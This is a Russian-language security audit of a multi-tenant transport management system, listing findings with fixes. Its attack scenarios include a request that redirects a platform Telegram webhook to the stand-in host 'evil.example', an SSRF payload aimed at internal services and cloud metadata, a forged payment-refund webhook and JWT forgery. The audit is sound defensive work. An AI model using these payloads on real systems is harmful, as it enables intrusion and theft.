# Security Engineer — аудит TMS 2026-10-15

**Персона/взгляд:** Security Engineer (AppSec), проверка по OWASP ASVS 4.0 (V2 Authentication, V3 Session, V4 Access Control, V5 Validation, V8 Data Protection, V12 Files, V13 API, V14 Config). Главный вопрос: может ли внешний атакующий или пользователь одного арендатора получить данные или права другого арендатора либо всей платформы.

**Охват (что прочитано):** `apps/api/src/server.ts`; `apps/api/src/auth/*` (auth.ts целиком, guards.ts, rbac.ts, password.ts, org-middleware.ts); `modules/billing/routes.ts` + `service.ts` (вебхук ЮKassa, handlePaymentCallback); `modules/signatures/gosklyuch-callback.ts`, `gosklyuch-envelope.ts`, `sign-endpoint.ts`; `modules/edi/routes.ts` + `service.ts`; `modules/notifications/routes.ts`, `app-notifications.routes.ts`; `modules/integrations/credentials/*`; `providers/base.ts`, `_http.ts`, `index.ts`, `edi/diadoc.ts`, `telematics/wialon.ts`, `email/console.ts`, `signature/gosklyuch.ts`; `integrations/routes.ts`, `websocket.ts`, `websocket-filters.ts`, `telegram.service.ts`; `modules/uploads/routes.ts`, `services/storage.service.ts`, вложения путевых листов в `modules/waybills/routes.ts`; `modules/sync/*`; `modules/import/routes.ts` (drivers); `modules/fleet/service.ts` (createDriver); `modules/onboarding/routes.ts`; `modules/contacts`, `dpa`, `operational-core/execution-routes.ts`, `inspections` (PDF, getById), `mchd`, `audit`, `carriers`, `copilot` (выборочно); `db/seed*.ts`; `packages/shared/src/schemas.ts`; `apps/web/src/middleware.ts`, `apps/web/next.config.*`; `apps/mobile/src/api/auth.ts`; `nginx/*.conf`, `docker-compose.prod.yml`, `.env.example`, `Dockerfile`'ы; `docs/qa/code-audit-2026-06-14.md`, `docs/qa/remediation-tracker.md`, `docs/TODO-OPS.md`, `docs/operations/first-pilot-deploy.md`.

**Метод:** ручное чтение кода. Плюс два эвристических скрипта: (1) какие маршруты не вызывают `authenticate` и не упоминают org-scope; (2) какие маршруты с `:param` не передают user/org в слой данных. Плюс grep по сырому SQL (`sql.raw`/`unsafe`), исходящим `fetch`, URL, которые задаёт арендатор, и секретам в git. Каждую находку я перечитал и пытался опровергнуть. Где эксплуатация зависит от конфигурации прода, которую из репозитория не видно, это сказано в поле «Статус». Код не запускался, только статический анализ на HEAD `4598a71`.

> Секреты в этом отчёте **замаскированы**. Реальное значение из SEC-01 намеренно не воспроизводится.

---

## Вердикт

Базовая гигиена хорошая и заметно выросла после аудита 2026-06-14. bcrypt(12), JWT с отзывом через `token_version`, cookie `httpOnly`+`SameSite=strict`, AES-256-GCM для кредов провайдеров с fail-fast без ключа, sniffing по magic bytes при загрузке файлов, отсутствие SQL-инъекций, централизованные `assert*Access`-гарды, enumeration-safe signup/forgot. Проблема в другом: **в git закоммичен общий seed-пароль прод-окружения** (SEC-01). Он открывает платформенного super-admin (`admin@tms.local` без org) и сервисный `system@tms.internal`. Одной этой находки достаточно, чтобы считать периметр скомпрометированным до ротации. Вторая группа рисков связана с тем, что **«tenant admin» в этой системе — это любой человек из интернета** (self-serve signup). Поэтому функции, которые доступны tenant-admin, но действуют на уровне платформы (вебхук Telegram-бота, SSRF через `baseUrl` провайдера), фактически открыты анонимному атакующему. Rate limit по IP обходится подделкой `X-Forwarded-For`: прошлый фикс закрыл только allowList. P1 по Telegram deep-link из прошлого аудита всё ещё открыт. В модели мультитенантности остаётся системный fail-open для учёток без org (`if (organizationId) filter`), а `seed.ts` создаёт именно такие учётки.

**Оценка зрелости области: 5/10.** Механизмы есть и в основном правильные. Мешают утечка секрета, platform-level действия у tenant-admin и неполная fail-closed модель.

## Сильные стороны

- **Пароли:** bcryptjs, cost 12 (`auth/password.ts`), хеширование вынесено из транзакции. Коды и временные пароли генерируются через CSPRNG (`randomInt`, `randomBytes`).
- **Сессии:** JWT проверяется по `users.token_version` и `is_active` на каждом запросе (`auth.ts:131-135`). Версия бампается при смене пароля, ролей и деактивации. Cookie `httpOnly`, `SameSite=strict`, `Secure` в prod. Мобильный токен лежит в `expo-secure-store`.
- **RBAC:** CASL, роли валидируются через `z.enum(APP_ROLES)`. Защита от самоэскалации (`PUT /users/:id` на самого себя), от lateral super-admin и от self-detach в super-admin (по умолчанию выключен).
- **Мультитенантность:** централизованные `assertTripAccess/OrderAccess/WaybillAccess/...` с C3-«б» DENY для org-less не-админов. Закрыта большая часть IDOR из прошлого аудита: adr, repairs, fleet, KPI, orders FK, import orders.number, marking, WS-broadcast fail-closed.
- **Секреты провайдеров:** AES-256-GCM (iv+tag), в prod без `CREDENTIALS_KEY` сервис падает, слабые ключи отвергаются. Тенант не может переопределить платформенные payment/email.
- **Файлы:** whitelist JPEG/PNG/WEBP/PDF, sniffing по magic bytes, совпадение claimed↔sniffed, ключ — UUID, защита от path traversal. Бакет MinIO по умолчанию приватный (anonymous только `public/`).
- **SQL:** только Drizzle-параметризация, `sql.raw` лишь для enum-маппинга колонок. LIKE экранируется.
- **Ошибки и логи:** generic 5xx в prod, обширный pino `redact` (пароли, коды, PII-поля 152-ФЗ).
- **ЮKassa:** статус платежа берётся из re-query через API, а не из тела запроса. `FOR UPDATE` + dedupe.
- **Госключ:** fail-closed seal-гейт: пока `verifyGosklyuchEnvelope` не реализован, подпись никогда не ставится в `signed`.
- **Инфраструктура:** контейнеры работают от non-root, `/metrics` не публикуется без basic-auth, Swagger в prod выключен, CORS fail-fast.

---

## Находки

### [P0] SEC-01 — Прод-пароль seed-аккаунтов (включая платформенного super-admin) закоммичен в git

- **Где:** `docs/TODO-OPS.md:61` (раздел «Сменить пароль админа `admin@tms.local`»); затронутые учётки создаются в `apps/api/src/db/seed.ts:30-45`, `apps/api/src/db/seed-demo.ts:64-80`, `apps/api/src/db/seed-demo-prod.ts:100-125`.
- **Что:** в документацию открытым текстом вписано значение `SEED_PASSWORD` из прод-`.env` (`_hk0R…` — замаскировано), с пометкой, что это действующий пароль `admin@tms.local`. Тем же паролем `seed.ts` создаёт:
  - `admin@tms.local` с ролью `admin` **без organizationId**, то есть платформенный super-admin с кросс-тенантной видимостью;
  - `system@tms.internal` (UUID `000…0`, `admin`, без org, `isActive=true`). Это сервисная учётка BullMQ, её пароль никто не меняет через UI;
  - logist/dispatcher/medic/… без org;
  - при использовании `seed-demo*` ещё `super@tms.local` и `demo-*@transpult.ru` (прод-демо).

  Репозиторий имеет remote `github.com/goga74russ/tms`. Если он публичный или когда-либо станет доступен третьим лицам, это прямой вход в прод.
- **Сценарий:** атакующий читает `docs/TODO-OPS.md` (или историю git) → `POST /api/auth/login {email:"system@tms.internal", password:<из файла>}` → получает cookie super-admin → видит данные всех арендаторов (биллинг `/admin/billing/overview`, лиды `/contacts`, пользователи, рейсы), может создавать admin-пользователей в любой org (`POST /api/auth/users` с `organizationId`).
- **Исправление:** (1) немедленно сменить пароли всех seed/demo-учёток в проде. `system@tms.internal` сделать неактивной (`is_active=false`) или с невалидным хешем: воркерам нужна только FK-строка. Поднять `token_version` всем. (2) Удалить строку из файла и вычистить историю (`git filter-repo`), считать секрет скомпрометированным. (3) Не использовать один `SEED_PASSWORD` для всех ролей. В prod-seed запретить org-less admin. (4) Добавить secret-scanning (gitleaks) в CI.
- **Статус:** CONFIRMED (секрет есть в репозитории). Действует ли он сейчас — PLAUSIBLE: файл прямо называет его действующим и просит сменить.

### [P1] SEC-02 — Все rate limit обходятся подделкой X-Forwarded-For (фикс прошлого P1 неполный)

- **Где:** `apps/api/src/server.ts:116` (`trustProxy: true`), `server.ts:217-220` (`keyGenerator` → `ip:${request.ip}`); `nginx/default.conf` и `nginx/default-ssl.conf` (`proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for`); per-route лимиты в `auth/auth.ts:146-151, 217-222, 1359-1364, 1480-1485, 1572-1577, 1691-1696, 1759-1764`, `modules/contacts/routes.ts:37`, `modules/signatures/gosklyuch-callback.ts:111`.
- **Что:** при `trustProxy: true` Fastify берёт `request.ip` из **самого левого** адреса XFF. nginx не перезаписывает заголовок, а дописывает к клиентскому, поэтому левый адрес полностью контролирует клиент. Фикс `28207d2` закрыл только loopback-allowList (сверка по `socket.remoteAddress`), а ключ лимита остался на `request.ip`. Ветка `user:${userId}` в `keyGenerator` мёртвая: rate-limit-хук срабатывает на `onRequest`, до `authenticate`, и `request.user` там всегда пуст.
- **Сценарий:** перебор пароля: `POST /api/auth/login` с `X-Forwarded-For: <случайный IP>` на каждый запрос. Лимит 5/мин превращается в nginx `limit_req` 30 r/s, то есть примерно в 360 раз слабее. То же касается `verify-email` (см. SEC-14), `forgot-password` (флуд писем), `/public/contact` (спам лидов) и Госключ callback.
- **Исправление:** вместо `trustProxy: true` указать доверие только адресу или подсети nginx (`trustProxy: '172.16.0.0/12'` или число хопов `1`) и/или в nginx выставлять `proxy_set_header X-Forwarded-For $remote_addr;`. Для login/verify добавить второй ключ лимита по email (account lockout / прогрессивная задержка). Убрать мёртвую user-ветку или перенести лимит на `preHandler`.
- **Статус:** CONFIRMED. Повтор: P1 `server.ts:221-226` (code-audit-2026-06-14), закрыт частично.

### [P1] SEC-03 — Telegram `/start <userId>` привязывает чат атакующего к чужой организации (не закрыто)

- **Где:** `apps/api/src/modules/notifications/routes.ts:33-74`.
- **Что:** `userId` из deep-link payload не проверяется на владение. Сервер резолвит `organizationId` этого пользователя и upsert-ит подписку `eventTypes:['*']` на `chatId` отправителя. `userId` — статический UUID: не одноразовый, без срока жизни. Он виден коллегам в `/auth/users`, в журналах событий (`authorId`), в URL deep-link.
- **Сценарий:** бывший сотрудник или любой, кто знает UUID сотрудника орг-жертвы, пишет боту `/start <uuid>` и получает в свой Telegram все уведомления орг-жертвы: рейсы, заявки, суммы счетов, ремонты.
- **Исправление:** одноразовый nonce (Redis, TTL 10 мин), который выдаёт `POST /telegram/link-token` под аутентификацией. Deep-link несёт только nonce. При `/start` nonce погашается и связывается с `userId` из Redis.
- **Статус:** CONFIRMED. Повтор: P1 `notifications/routes.ts:33-86` (code-audit-2026-06-14, «остаётся 1 P1»), не закрыто.

### [P1] SEC-04 — Любой tenant-admin (то есть любой после self-signup) управляет вебхуком **платформенного** Telegram-бота и получает его секрет

- **Где:** `apps/api/src/modules/notifications/routes.ts:156-174` (`POST /telegram/setup-webhook`, `DELETE /telegram/webhook`, `GET /telegram/bot-info` под `requireAbility('manage','Settings')`); `apps/api/src/integrations/telegram.service.ts:66-73`.
- **Что:** бот один на всю платформу (`TELEGRAM_BOT_TOKEN` из env), а право `manage Settings` есть у любого `admin` (`can('manage','all')`), в том числе у арендатора. `setWebhook(url)` берёт `url` из тела без валидации и отправляет в Telegram вместе с `secret_token: TELEGRAM_WEBHOOK_SECRET`.
- **Сценарий:** злоумышленник регистрируется (`/api/auth/signup`, становится admin своей org) → `POST /api/telegram/setup-webhook {"url":"https://evil.example/hook"}` → Telegram начинает слать все входящие апдейты бота (сообщения пользователей всех арендаторов, `/start <userId>`) на сервер атакующего, причём с заголовком `X-Telegram-Bot-Api-Secret-Token`, то есть **секрет вебхука утекает**. Подписка новых пользователей перестаёт работать (DoS), атакующий собирает userId для SEC-03. `DELETE /telegram/webhook` отключает бота для всех.
- **Исправление:** эти три маршрута разрешить только платформенному super-admin (`isPlatformSuperAdmin`) или вообще убрать из API: настраивать вебхук скриптом деплоя с фиксированным URL из env. После исправления ротировать `TELEGRAM_WEBHOOK_SECRET`.
- **Статус:** CONFIRMED.

### [P1] SEC-05 — SSRF через задаваемый арендатором `baseUrl` провайдера ЭДО с отражением ответа

- **Где:** `apps/api/src/providers/edi/diadoc.ts:66-67, 91-122, 187-193`; `apps/api/src/modules/integrations/credentials/validators.ts:21-26` (`credentials: z.record(z.unknown())`); `apps/api/src/modules/integrations/credentials/routes.ts:250-327` (`POST /integrations/credentials/:id/test`). Аналогичные поля `apiUrl` есть в `providers/telematics/{wialon,omnicomm,glonasssoft}.ts` и `providers/email/unisender.ts:109` (сейчас не эксплуатируемы: заглушки или запрет email-кредов для арендатора).
- **Что:** креды хранятся как произвольный объект. `DiadocEdiProvider` берёт `creds.baseUrl` без проверки схемы и хоста. `/test` вызывает `healthCheck()`, тот делает `GET {baseUrl}/v1/organizations/my`. На non-2xx в `detail` попадают первые 300 символов тела ответа: они возвращаются клиенту и пишутся в `lastError`. Суффикс пути обходится через `?`/`#` в `baseUrl`.
- **Сценарий:** self-signup admin → `POST /api/dpa/diadoc/accept` → `POST /api/integrations/credentials {providerType:"edi", providerName:"diadoc", credentials:{apiKey:"x", baseUrl:"http://minio:9000/tms?"}}` → `POST .../:id/test`. API из своей docker-сети ходит на внутренние сервисы (`minio:9000`, `web:3000`, `api:4000/metrics`, `169.254.169.254` облачного metadata) и отдаёт кусок ответа или код ошибки. Это сканирование внутренней сети и чтение ошибок внутренних сервисов. Плюс заголовок `x-kontur-apikey` уходит на произвольный хост.
- **Исправление:** убрать `baseUrl`/`apiUrl` из пользовательских кредов: прод/стейдж выбирать флагом `staging`, хосты держать в allowlist в коде. Если override нужен, то только из env или для super-admin. Дополнительно сделать общий egress-гард в `httpFetch` (запрет приватных, loopback и link-local диапазонов после DNS-резолва) и не возвращать тело ответа в `detail`.
- **Статус:** CONFIRMED (путь кода). Реальная ценность внутренних ответов зависит от инфраструктуры (PLAUSIBLE).

### [P2] SEC-06 — Системный fail-open для учёток без организации и сущностей без org

- **Где (примеры):** `apps/api/src/auth/guards.ts:72` (`if (knownOrganizationIds.length === 0) return;` — сущность с `organization_id IS NULL` доступна любому арендатору); `modules/inspections/service.ts:468-482, 793-809` (`getTechInspectionById/getMedInspectionById` фильтруют только `if (organizationId)`); `integrations/websocket.ts:216-218` и `websocket-filters.ts:38-41` (позиции ТС: org-less dispatcher/logist/manager видит всё); `integrations/routes.ts:34-40` (`vehicleInOrg` пропускает при `!orgId` или `!v.org`); `modules/copilot/tools/index.ts:41-50`; `auth/auth.ts:1083-1085` (`GET /auth/contracts` без C3-DENY, в отличие от соседнего `/auth/tariffs`); `modules/carriers/routes.ts:40,91,135,186,212`; `modules/audit/routes.ts:124`. Всего около 140 мест с шаблоном `if (organizationId) where(...)`.
- **Что:** правило «нет org = видит всё» корректно только для платформенного super-admin. C3-«б» применён к гардам и части списков, но не везде. При этом `apps/api/src/db/seed.ts` создаёт **все** роли (medic, logist, dispatcher, accountant…) без `organizationId`, а `/import/drivers` от super-admin создаёт драйверов с `organization_id=NULL`. Такие записи гард пропускает для всех арендаторов.
- **Сценарий:** прод засижен `seed.ts` (TODO-OPS упоминает seed-аккаунт `admin@tms.local`) → у `medic@tms.local` нет org → `GET /api/inspections/med/:id/pdf` отдаёт медосмотры любого арендатора: это данные о здоровье, специальная категория 152-ФЗ ст. 10. В связке с SEC-01 (тот же пароль) риск реальный.
- **Исправление:** единый helper `orgScopeOrDeny(user)`: super-admin → без фильтра, org-less не-админ → 403. Заменить им все `if (organizationId)`. В `assertOrganizationScope` NULL-org сущности открывать только super-admin. Миграцией назначить org seed-пользователям или деактивировать их. Добавить тест-линтер на шаблон `if (\w*organizationId)`.
- **Статус:** CONFIRMED (код). Повтор: C3 механизм «б» / fleet org-less (code-audit-2026-06-14, «ЗАКРЫТО-НО-ОТКРЫТО»), закрыто частично.

### [P2] SEC-07 — `GET /transport-documents/:id`: горизонтальный IDOR внутри арендатора (client/driver), утечка externalId

- **Где:** `apps/api/src/modules/signatures/sign-endpoint.ts:380-438`.
- **Что:** проверяется только совпадение org документа и пользователя. `assertTripAccess` нет, хотя `requireAbility('read','Trip')` пропускает роли `client` (внешний заказчик) и `driver`. Ответ содержит строку `transport_documents` целиком: `externalId`, `orderIds`, `metadata.pendingSignatures` (mchdId, signerInn), историю подписей.
- **Сценарий:** пользователь-клиент заказчика X перебирает или узнаёт id ЭТрН рейсов заказчика Y того же перевозчика и читает их метаданные. Полученный `externalId` — единственный якорь подлинности публичного Госключ-callback (см. SEC-08).
- **Исправление:** вызывать `assertTripAccess(doc.tripId, user)` (как в `edi/routes.ts`), убрать `externalId`/`pendingSignatures` из ответа для не-staff ролей.
- **Статус:** CONFIRMED.

### [P2] SEC-08 — Госключ callback: externalId формата `gk-…` без секрета, HMAC для него отключён

- **Где:** `apps/api/src/providers/signature/gosklyuch.ts:60` (`gk-${documentId.slice(0,8)}-${Date.now()}`); `apps/api/src/modules/signatures/gosklyuch-callback.ts:74-84` (gk-формат проходит без HMAC), `:108-115` (rate limit 20/мин по спуфаемому IP, см. SEC-02), `:24-26` (signedXml до 4 МБ).
- **Что:** у публичного эндпоинта нет ни одного секрета: externalId состоит из префикса id документа и метки времени. Любой, кто знает id документа (SEC-07) или externalId, может постить конверты. Благодаря fail-closed гейту (`verifyGosklyuchEnvelope` → `false`) подпись не станет `signed`, но в `metadata.signatures[]` дописывается произвольный XML по 4 МБ за запрос, а документ переводится в `pending_review`.
- **Сценарий:** атакующий постит поддельные конверты → документ висит на ручной проверке с фальшивыми «подписями», а оператор под давлением сроков может их одобрить. Параллельно растёт JSONB-строка (DoS БД).
- **Исправление:** при `/sign` генерировать `externalId = gk-<uuid>.<HMAC>` или хранить отдельный одноразовый `callbackToken` в `pendingSignatures` и требовать его в callback. Ограничить число подписей на документ, включить `GOSKLYUCH_CALLBACK_IP_ALLOWLIST` в prod.
- **Статус:** CONFIRMED (код). Практическая эксплуатация ограничена seal-гейтом.

### [P2] SEC-09 — ЮKassa: поддельный `refund.succeeded` отменяет любой известный платёж

- **Где:** `apps/api/src/modules/billing/routes.ts:249-301` (при `isRefund` статус принудительно `'refunded'`, re-query только подтверждает существование платежа, `eventId` берётся из тела); `modules/billing/service.ts:445-460`.
- **Что:** для рефанда re-query не проверяет, что возврат реально был (`real.refunded_amount`/`GET /refunds/{object.id}`). Ключ дедупликации `object.id:object.status` контролирует отправитель.
- **Сценарий:** любой, кто знает `provider_payment_id` (свой или чужой: из письма, чека, логов), шлёт `POST /api/billing/webhook/yookassa {"event":"refund.succeeded","object":{"id":"x","payment_id":"<id>","status":"succeeded"}}`. Платёж помечается `refunded`, подписка отзывается, а финансовый учёт расходится с ЮKassa.
- **Исправление:** для рефанда делать re-query `GET /v3/refunds/{object.id}`, проверять `status=succeeded` и совпадение `payment_id`. Дедуплицировать по id рефанда, полученному из API.
- **Статус:** CONFIRMED.

### [P2] SEC-10 — Демо-эндпоинт ручной смены EDI-статуса ЭТрН работает в production

- **Где:** `apps/api/src/modules/edi/routes.ts:166-215` (`POST /transport-documents/:id/edi/mock-progress`); `modules/edi/service.ts:262-302`.
- **Что:** маршрут описан как «Mock-эндпоинт для демонстрации», но не закрыт по `NODE_ENV`/флагу. Admin арендатора может выставить `ediStatus = signed_by_client` без подписи контрагента в ЭДО.
- **Сценарий:** недобросовестный перевозчик помечает ЭТрН как подписанную грузополучателем, хотя подписи в ГИС ЭПД нет. Это вводит в заблуждение бухгалтерию, клиентский портал и закрытие рейса (юр. значимый статус).
- **Исправление:** регистрировать маршрут только при `NODE_ENV!=='production'` или `ALLOW_MOCK_EDI=true`. В prod ручная коррекция только с обязательным основанием и отдельным статусом `manually_marked`.
- **Статус:** CONFIRMED.

### [P2] SEC-11 — Код подтверждения email возвращается в ответе signup в prod без `SMTP_HOST`; секреты почты уходят в stdout

- **Где:** `apps/api/src/auth/auth.ts:1472` (`(NODE_ENV!=='production' || !SMTP_HOST) ? {devCode}`); `apps/api/src/providers/index.ts:166-177` (Unisender — поддерживаемый prod-путь без `SMTP_HOST`); `apps/api/src/providers/email/console.ts:20-24`.
- **Что:** условие проверяет только `SMTP_HOST`. Если прод шлёт почту через Unisender или почта не настроена, `/signup` отдаёт `devCode`, и подтверждение владения email не работает. Console-адаптер (fallback) печатает в stdout текст писем: коды верификации, **ссылки сброса пароля**, временные пароли приглашённых. Всё это уходит в docker-логи и Loki.
- **Сценарий:** регистрация на чужой корпоративный email (`ivanov@realcarrier.ru`) с немедленным подтверждением. Человек с доступом к логам перехватывает reset-ссылку и захватывает аккаунт.
- **Исправление:** в prod никогда не возвращать `devCode` (только при `NODE_ENV!=='production' && DEMO_MODE`). В prod запретить console-адаптер (fail-fast при старте, если нет ни SMTP, ни Unisender) либо маскировать ссылки и коды в логе.
- **Статус:** CONFIRMED (код). Эксплуатируемость зависит от prod-конфига почты.

### [P2] SEC-12 — Выкладка по умолчанию идёт без TLS, а runbook ссылается на несуществующий TLS-конфиг

- **Где:** `docker-compose.prod.yml:232` (`${NGINX_CONF:-./nginx/default.conf}` — HTTP-only), `.env.example` (`NGINX_CONF=./nginx/default.conf`, `COOKIE_SECURE=false`, `TMS_PUBLIC_SCHEME=http`); `docs/operations/first-pilot-deploy.md:150` и `docs/operations/pre-launch-checklist.md:50` → `nginx/default-tls.conf`, хотя в репо есть только `nginx/default-ssl.conf`.
- **Что:** по шаблону прод поднимается на HTTP с `Secure`-флагом cookie, выключенным явно. Если следовать runbook при переходе на TLS, монтируется несуществующий файл (Docker создаёт пустой каталог, nginx не стартует), поэтому оператор откатится обратно на HTTP. В HTTP-конфиге нет HSTS.
- **Сценарий:** JWT-cookie, пароли и ПДн водителей идут открытым текстом. На публичном Wi-Fi (водители, диспетчеры) сессию легко перехватить.
- **Исправление:** исправить имя в доках (или переименовать файл), сделать TLS-конфиг дефолтом для prod-compose, `COOKIE_SECURE=true` в шаблоне. Отказываться стартовать при `NODE_ENV=production && COOKIE_SECURE=false`, кроме явного `ALLOW_INSECURE_HTTP=true`.
- **Статус:** CONFIRMED.

### [P2] SEC-13 — Нет проверки стойкости `JWT_SECRET` (плейсхолдер из `.env.example` принимается)

- **Где:** `apps/api/src/auth/auth.ts:50-54`; `.env.example` (`JWT_SECRET=CHANGE_ME_LONG_RANDOM_SECRET_AT_LEAST_32_HEX_CHARS`); `docker-compose.prod.yml` (тот же секрет передаётся в `web`).
- **Что:** проверяется только наличие секрета. Значение-плейсхолдер (50 символов, публично известно) или короткий секрет принимаются. Для `CREDENTIALS_KEY` такая проверка уже есть.
- **Сценарий:** оператор не заменил плейсхолдер → кто угодно подписывает HS256-токен `{userId:<любой>, roles:['admin'], tv:0}`. `authenticate` сверяет только `tv` и `isActive` (у seed-пользователей `tv=0`), а UUID пользователя достаточно знать (например, `system` = `000…0`) → полный доступ super-admin.
- **Исправление:** fail-fast, если секрет содержит `CHANGE_ME` или в нём меньше 32 байт энтропии (длина ≥ 64 hex или ≥ 43 base64). Документировать генерацию `openssl rand -hex 32`.
- **Статус:** CONFIRMED (отсутствие проверки). Эксплуатация зависит от конфигурации.

### [P2] SEC-14 — verify-email: 6-значный код без счётчика попыток, успех сразу выдаёт сессию

- **Где:** `apps/api/src/auth/auth.ts:1478-1564`.
- **Что:** после фикса `e0a901a` старые коды инвалидируются, но счётчика неудачных попыток на код или email нет, а единственный ограничитель — IP-лимит, который обходится (SEC-02). При успехе выставляется auth-cookie (вход в аккаунт).
- **Сценарий:** жертва регистрируется → атакующий за 15 минут TTL перебирает до 10⁶ кодов с ротацией XFF (≈27k попыток на один реальный IP при nginx 30 r/s; ботнетом больше). Подобранный код даёт сессию admin новой org жертвы.
- **Исправление:** счётчик попыток на запись `email_verifications` (≤5, затем инвалидация), лимит по email. Не выставлять сессию на verify: требовать логин паролем.
- **Статус:** CONFIRMED. Повтор: P2 `auth.ts:1463-1481` (code-audit-2026-06-14), закрыт частично.

### [P3] SEC-15 — `/import/drivers` принимает чужой `userId` (driver-transplant), строки не валидируются Zod

- **Где:** `apps/api/src/modules/import/routes.ts:163-198`.
- **Что:** `item.userId` из тела вставляется в `drivers.user_id` без проверки org пользователя. В `fleet/service.ts:429-437` такая проверка есть («Можно привязать только пользователя своей организации»). `items` типизированы как `any`.
- **Сценарий:** admin орг A привязывает карточку водителя к пользователю орг B (UUID известен) → нарушение целостности. Пользователь B больше не может стать водителем у себя (unique `idx_drivers_user_unique`), а по разнице FK/unique-ошибок можно проверять, существует ли UUID.
- **Исправление:** ту же проверку, что в `createDriver`. Zod-схема строки импорта (`DriverCreateSchema` без `userId` или с проверкой).
- **Статус:** CONFIRMED.

### [P3] SEC-16 — Сессия: 24 ч без refresh, logout не отзывает токен, WS-токен в query string

- **Где:** `apps/api/src/auth/auth.ts:56-61, 269-275`; `apps/api/src/integrations/websocket.ts:143-144`.
- **Что:** access-JWT живёт 24 ч, refresh-пары нет (ASVS 3.3). `POST /logout` только чистит cookie, `token_version` не бампается: украденная cookie действует до истечения. WS принимает токен из `?token=` (legacy), и он попадает в access-логи nginx и pino (`req.url`). WS-эндпоинт принимает и полноценный 24-часовой токен, а не только 5-минутный.
- **Исправление:** access 15 мин + refresh (httpOnly, ротация), бамп `token_version` (или denylist по `jti`) при logout. Убрать query-fallback и требовать в WS claim `typ:'ws'`.
- **Статус:** CONFIRMED.

### [P3] SEC-17 — Слабая парольная политика и оракулы существования учётки

- **Где:** `packages/shared/src/schemas.ts:37-40` (login `min(6)`); `apps/api/src/auth/auth.ts:717, 737` (создание и смена пароля админом `min(6)`), `:1301, 1659` (`min(8)`); `auth.ts:170-177` (неизвестный email → ответ без bcrypt, timing-оракул); `auth.ts:839-844` (`409 Email already exists`) и `modules/onboarding/routes.ts:282-292` (`alreadyRegistered`): глобальный оракул существования email для любого self-signup admin.
- **Исправление:** минимум 12 символов, проверка по словарю утечек, dummy-bcrypt для неизвестного email. Для приглашений — единообразный ответ без раскрытия чужих аккаунтов (или per-org email-пространство). Обязательная смена временного пароля при первом входе.
- **Статус:** CONFIRMED. Оракул invite-team — повтор P1 (code-audit-2026-06-14), закрыт частично: silent-skip исправлен, оракул остался.

### [P3] SEC-18 — API ходит в MinIO под root-кредами, вложения путевых листов лежат на диске контейнера

- **Где:** `docker-compose.prod.yml:114-118` (`S3_ACCESS_KEY: ${MINIO_ROOT_USER}`); `apps/api/src/modules/waybills/routes.ts:48-55, 288-291`.
- **Что:** при компрометации API (например, через SSRF или RCE) атакующий получает полный админ-доступ к MinIO: политики бакетов, можно сделать бакет публичным. Вложения путевых листов (ПДн) пишутся в `process.cwd()/uploads` контейнера и не попадают в бэкапы MinIO.
- **Исправление:** отдельный MinIO-пользователь с политикой только на бакет `tms`. Перенести вложения ПЛ в `storage.service`.
- **Статус:** CONFIRMED.

### [P3] SEC-19 — Заголовки и CSP

- **Где:** `apps/web/next.config.*` (`script-src 'unsafe-inline' 'unsafe-eval'`, `connect-src http: https: ws: wss:` — любой хост); `apps/api/src/server.ts:153-163` (`'unsafe-inline'` ради Swagger, который в prod выключен); `nginx/*.conf` (`X-XSS-Protection` устарел, в HTTP-конфиге нет HSTS); `server.ts:269` (сравнение basic-auth `/metrics` не constant-time).
- **Исправление:** nonce-based CSP для Next (middleware), `connect-src 'self'` + конкретный WS-хост. В prod убрать `unsafe-inline` у API. Сравнение через `timingSafeEqual`.
- **Статус:** CONFIRMED.

### [P3] SEC-20 — Tenant-admin запускает глобальные синхронизации, любой авторизованный видит статистику очередей

- **Где:** `apps/api/src/integrations/routes.ts:45-74` (`/integrations/wialon/sync`, `/fines/sync` ставят job на **все** org; квоты внешних API и нагрузку ГИБДД/Wialon расходует любой self-signup admin); `:77-117` (`/integrations/status` без ролевого гейта).
- **Исправление:** ставить job с параметром `organizationId` актора или открыть эти маршруты только super-admin. Status отдавать только admin.
- **Статус:** CONFIRMED.

### [P3] SEC-21 — Конфигурационные пробелы в `.env.example` и логировании

- **Где:** `.env.example` (нет `GOSKLYUCH_CALLBACK_SECRET` — без него prod не стартует, `server.ts:193-196`; нет `TELEGRAM_WEBHOOK_SECRET`, `METRICS_BASIC_AUTH_*`, `GOSKLYUCH_CALLBACK_IP_ALLOWLIST`, `UNISENDER_*`); `server.ts:111` и `:462-465` (клиентский `x-request-id` принимается как id лога без валидации: подделка корреляции и log-injection); `modules/onboarding/routes.ts:338` (email в error-логе), `auth.ts:1742` (reset-token в query ссылки: попадает в access-логи web).
- **Исправление:** дополнить шаблон с пометкой «обязательно в prod». Валидировать `x-request-id` (`^[A-Za-z0-9-]{1,64}$`), иначе генерировать. Передавать reset-token через fragment (`#token=`) или одноразовый обмен.
- **Статус:** CONFIRMED.

---

### Статус security-находок из `docs/qa/code-audit-2026-06-14.md`

| Прошлая находка | Статус на 2026-10-15 |
|---|---|
| P1 login rate-limit XFF (`server.ts:221-226`) | **Частично:** allowList исправлен, ключ лимита по-прежнему спуфаемый → SEC-02 |
| P1 Telegram deep-link (`notifications/routes.ts:33-86`) | **Не закрыто** → SEC-03 |
| P1 invite-team email oracle | **Частично:** silent-skip исправлен, оракул остался → SEC-17 |
| P1 adr IDOR, createOrder FK, repairs IDOR/каталог, KPI topDrivers, orders customerPrice, import orders.number | Закрыто (выборочно проверил adr, repairs, orders, fleet createDriver: гарды на месте) |
| P1 fleet org-less DENY / C3 «б» | **Частично:** гарды исправлены, но системный fail-open остался → SEC-06 |
| P2 verify-email брутфорс | **Частично:** накопление кодов исправлено, нет счётчика попыток → SEC-14 |
| P2 EDI webhook без валидации | Закрыто (провайдер валидируется, тело не логируется; обработчик — no-op) |
| P2 WS broadcast без org | Закрыто (fail-closed) |
| P3 PUT /users lateral super-admin, plan-guard super_admin, pagination guard | Закрыто |
| P3 Госключ allowlist по `socket.remoteAddress` | Закрыто, но см. SEC-08 (у gk-формата нет секрета) |

---

## Рекомендации / Next Actions

1. **Сегодня:** ротировать все пароли seed/demo-учёток в проде, деактивировать вход `system@tms.internal`, поднять `token_version` всем. Удалить пароль из `docs/TODO-OPS.md` и из истории git, проверить видимость репозитория, добавить gitleaks в CI (SEC-01).
2. Перевести Telegram setup/delete-webhook в super-admin-only или убрать из API, ротировать `TELEGRAM_WEBHOOK_SECRET` (SEC-04). Сделать привязку Telegram через одноразовый nonce (SEC-03).
3. Убрать `baseUrl`/`apiUrl` из пользовательских кредов, добавить egress-гард в `httpFetch` от приватных и link-local адресов, не отражать тело ответа в health-detail (SEC-05).
